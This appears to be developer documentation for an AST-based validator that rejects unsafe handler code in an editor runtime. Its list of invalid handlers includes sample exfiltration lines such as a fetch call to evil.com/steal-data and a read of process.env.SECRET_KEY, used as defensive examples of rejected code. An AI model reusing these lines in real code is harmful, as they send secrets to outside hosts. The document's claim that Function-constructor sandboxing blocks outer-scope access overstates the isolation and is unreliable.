# Handler Validation System

## Overview

The Handler Validation System provides AST-based security validation for handler code to prevent malicious code execution, prototype pollution, and unauthorized global access.

## Architecture

### Components

1. **`handler-security-rules.ts`** - Security rule definitions
   - Forbidden globals (eval, window, process, etc.)
   - Forbidden properties (__proto__, constructor, prototype)
   - Allowed globals (Runtime API parameters)
   - Error messages

2. **`handler-validator.ts`** - AST-based validation logic
   - Parses handler code using Acorn parser
   - Walks AST to detect security violations
   - Validates individual handlers and entire components
   - Returns detailed error information

3. **Integration Points**
   - `update-component.handler.ts` - Validates before saving updates
   - `add-component.handler.ts` - Validates before creating components
   - `compiler.ts` - Defensive validation before code compilation

## Security Rules

### Forbidden Patterns

#### 1. Direct Code Execution
- `eval()` - Direct code execution
- `Function()` constructor - Dynamic function creation
- `setTimeout(string)` - String eval via timeout
- `setInterval(string)` - String eval via interval

**Reason**: These patterns allow arbitrary code execution and bypass all security measures.

#### 2. Global Object Access
- `window` - Browser global object
- `global` - Node.js global object
- `globalThis` - Universal global object
- `process` - Node.js process object
- `require` - CommonJS module loader
- `import()` - Dynamic ES6 imports

**Reason**: Access to global objects can leak sensitive information or enable privilege escalation.

#### 3. Prototype Manipulation
- `__proto__` - Prototype chain manipulation
- `prototype` - Direct prototype access
- `constructor` - Constructor function access

**Reason**: Prototype pollution can affect all objects in the application and enable code execution.

#### 4. Storage Access
- `localStorage` - Browser local storage
- `sessionStorage` - Browser session storage
- `indexedDB` - Browser database

**Reason**: Direct storage access bypasses the runtime's state management and can leak data.

#### 5. Network Access
- `fetch()` - HTTP requests
- `XMLHttpRequest` - Legacy HTTP requests
- `WebSocket` - WebSocket connections

**Reason**: Network access should go through controlled APIs to prevent data exfiltration.

### Allowed Globals

Handlers can access 45+ runtime API parameters:

**Core Services**
- `Database` - Database client
- `Components` - Component registry
- `Editor` - Editor instance
- `eventHandler` - Event handling system

**Context Data**
- `Event` - Current event object
- `EventData` - Event data payload
- `Current` - Current component
- `Item` - Current iteration item
- `Vars` - Application variables
- `Apps` - Application list
- `Values` - Form values

**Variable Functions**
- `GetVar(name)` - Get variable value
- `SetVar(name, value)` - Set variable value
- `GetContextVar(name)` - Get context variable
- `SetContextVar(name, value)` - Set context variable

**Component Functions**
- `GetComponent(id)` - Get component by ID
- `GetComponents()` - Get all components
- `AddComponent(schema)` - Add new component
- `updateInput(component, name, type, value)` - Update input
- `updateStyle(component, name, value)` - Update style
- `updateEvent(component, name, value)` - Update event
- `updateName(component, name)` - Update component name
- `updateInputHandlers(component, name, value)` - Update input handler
- `updateStyleHandlers(component, name, value)` - Update style handler

**Navigation Functions**
- `NavigateToUrl(url)` - Navigate to URL
- `NavigateToHash(hash)` - Navigate to hash
- `NavigateToPage(name)` - Navigate to page

**Page Functions**
- `AddPage(schema)` - Add new page
- `UpdatePage(id, data)` - Update page
- `deletePage(id)` - Delete page

**Clipboard Functions**
- `CopyComponentToClipboard(component)` - Copy component
- `PasteComponentFromClipboard()` - Paste component
- `DeleteComponentAction(id)` - Delete component

**Editor Functions**
- `openEditorTab(tab)` - Open editor tab
- `setCurrentEditorTab(tab)` - Set current tab

**Function Invocation**
- `InvokeFunction(name, args)` - Invoke server-side function

**File Operations**
- `UploadFile(file)` - Upload file
- `BrowseFiles()` - Browse files

**Utilities**
- `Utils` - Utility functions
- `console` - Console logging (editor console)

**Standard JavaScript Built-ins** (Safe)
- `Object`, `Array`, `String`, `Number`, `Boolean`, `Date`
- `Math`, `JSON`, `RegExp`, `Error`, `Promise`
- `Map`, `Set`, `WeakMap`, `WeakSet`
- `parseInt`, `parseFloat`, `isNaN`, `isFinite`
- `encodeURI`, `decodeURI`, `encodeURIComponent`, `decodeURIComponent`

## Usage

### Validating Handler Code

```typescript
import { validateHandlerCode } from '@shared/utils/handler-validator';

const code = `
  const count = GetVar('count') || 0;
  SetVar('count', count + 1);
  return count + 1;
`;

const result = validateHandlerCode(code);

if (!result.valid) {
  console.error('Validation failed:', result.errors);
  result.errors.forEach(error => {
    console.log(`${error.type}: ${error.message}`);
    console.log(`Location: Line ${error.line}, Column ${error.column}`);
  });
}
```

### Validating Component Handlers

```typescript
import { validateComponentHandlers } from '@shared/utils/handler-validator';

const component = {
  event: {
    onClick: "SetVar('clicked', true)",
  },
  inputHandlers: {
    label: "return GetVar('labelText') || 'Default'",
  },
  styleHandlers: {
    color: "return $theme === 'dark' ? '#fff' : '#000'",
  }
};

const result = validateComponentHandlers(component);

if (!result.valid) {
  console.error('Component validation failed');
  result.errors.forEach(error => {
    console.log(`${error.code}: ${error.message}`);
  });
}
```

## Validation Flow

```
User edits handler
        ↓
Frontend validation (optional, for UX)
        ↓
updateComponentHandler() / addComponentHandler()
        ↓
validateComponentHandlers()
        ↓
Parse code with Acorn
        ↓
Walk AST and check rules
        ↓
┌─────────────────────┐
│ Valid?              │
└─────────────────────┘
   ↓              ↓
  Yes            No
   ↓              ↓
Save to API    Emit validation error
               Reject save
               Show error to user
```

## Error Handling

When validation fails, the system:

1. **Emits `component:validation-error` event** with error details
2. **Logs to Editor console** via `kernel:log` event
3. **Rejects the save promise** with error information
4. **Console.error** for debugging

### Error Event Structure

```typescript
{
  type: "validation_error",
  componentId: "component-uuid",
  message: "Security violation: Use of 'eval()' is forbidden...",
  errors: [
    {
      type: "forbidden_function",
      message: "Use of 'eval()' is forbidden for security reasons...",
      line: 2,
      column: 5,
      code: "event.onClick: eval('bad code')",
      identifier: "eval"
    }
  ]
}
```

## Examples

### ✅ Valid Handlers

```javascript
// Variable access
const count = GetVar('clickCount') || 0;
SetVar('clickCount', count + 1);

// Navigation
NavigateToPage('Dashboard');

// Component updates
updateInput(Current, 'text', 'static', 'Hello World');
updateStyle(Current, 'color', 'red');

// Async operations
const data = await InvokeFunction('fetchData', { id: 123 });
SetVar('userData', data);

// Conditional logic
if (GetVar('isLoggedIn')) {
  NavigateToPage('Dashboard');
} else {
  NavigateToPage('Login');
}

// Array operations
const items = GetVar('items') || [];
const names = items.map(item => item.name);

// Standard built-ins
const date = new Date();
const json = JSON.stringify({ date });
const max = Math.max(1, 2, 3);
```

### ❌ Invalid Handlers

```javascript
// ❌ eval() is forbidden
eval('malicious code');

// ❌ Function constructor is forbidden
new Function('return 1')();

// ❌ window access is forbidden
window.location.href = 'evil.com';

// ❌ process access is forbidden
process.env.SECRET_KEY;

// ❌ __proto__ manipulation is forbidden
obj.__proto__ = {};

// ❌ setTimeout with string is forbidden
setTimeout('alert(1)', 1000);

// ❌ Direct fetch is forbidden
fetch('https://evil.com/steal-data');

// ❌ localStorage access is forbidden
localStorage.setItem('key', 'value');

// ❌ require() is forbidden
const fs = require('fs');

// ❌ Dynamic imports are forbidden
import('malicious-module');
```

## Testing

Run the validation tests:

```bash
npm test -- handler-validator.test.ts
```

Test coverage:
- ✅ Malicious code detection (15+ test cases)
- ✅ Valid code acceptance (15+ test cases)
- ✅ Edge cases (syntax errors, variable shadowing, etc.)
- ✅ Component validation (mixed handlers)
- ✅ Real-world patterns (forms, navigation, state management)

## Defense in Depth

The validation system implements multiple layers of security:

1. **Client-side validation** (update/add handlers)
   - Provides immediate feedback to developers
   - Prevents accidental security issues
   - Improves user experience

2. **Defensive validation** (compiler)
   - AST-based validation (same as client-side, enforced at compile time)
   - Catches bypassed validation
   - Last line of defense before execution

3. **Runtime sandboxing** (Function constructor)
   - Limited scope via IIFE
   - No access to outer scopes
   - Only injected parameters available

## Performance

- **Validation time**: 1-5ms for typical handlers
- **Cache impact**: Validation results could be cached
- **AST parsing**: Acorn is fast (~0.5-2ms for small code)
- **Overhead**: Negligible compared to network latency

## Future Improvements

1. **Server-side validation** - Mirror validation on server
2. **Caching** - Cache validation results for unchanged handlers
3. **Inline feedback** - Real-time validation in Monaco Editor
4. **Custom rules** - Allow configuring security rules per application
5. **Performance monitoring** - Track validation performance metrics
6. **Whitelist management** - UI for managing allowed patterns

## Security Considerations

⚠️ **Important**: Client-side validation alone is not sufficient for security. Always implement server-side validation as well.

### Best Practices

1. **Never trust client data** - Always re-validate on server
2. **Keep rules updated** - Review security rules regularly
3. **Monitor violations** - Log and alert on validation failures
4. **Educate users** - Provide clear error messages and documentation
5. **Test thoroughly** - Maintain high test coverage for security code

## Troubleshooting

### "Validation failed but I'm not using forbidden patterns"

Check for variable shadowing. If you declare a local variable with a forbidden name, the validator will allow it:

```javascript
// ❌ This will fail (using global 'window')
const url = window.location.href;

// ✅ This will pass (local variable named 'window')
const window = 'my-window-name';
console.log(window);
```

### "Getting false positives"

1. Check if you're using the correct runtime API functions
2. Verify the code is syntactically correct
3. Look at the error details (line, column, identifier)
4. Check the test suite for similar patterns

### "Validation is too strict"

The validation rules are designed to be secure by default. If you need access to a particular API:

1. Check if there's a runtime API equivalent (e.g., `InvokeFunction` instead of `fetch`)
2. Use `GetVar/SetVar` instead of direct storage access
3. Request new runtime API features if needed

## References

- [Acorn Parser Documentation](https://github.com/acornjs/acorn)
- [OWASP Code Injection Prevention](https://owasp.org/www-community/attacks/Code_Injection)
- [Prototype Pollution Attacks](https://owasp.org/www-community/attacks/Prototype_Pollution)
